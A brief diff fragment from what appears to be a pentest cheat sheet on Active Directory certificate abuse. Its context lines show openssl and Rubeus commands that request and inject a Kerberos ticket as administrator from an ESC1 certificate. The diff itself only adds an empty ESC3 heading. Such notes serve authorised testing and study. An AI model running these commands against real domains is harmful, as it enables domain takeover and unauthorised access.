@@ -59,6 +59,8 @@ openssl.exe pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Pr
 Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt
 ```
 
+#### ESC3
+
 
 
 
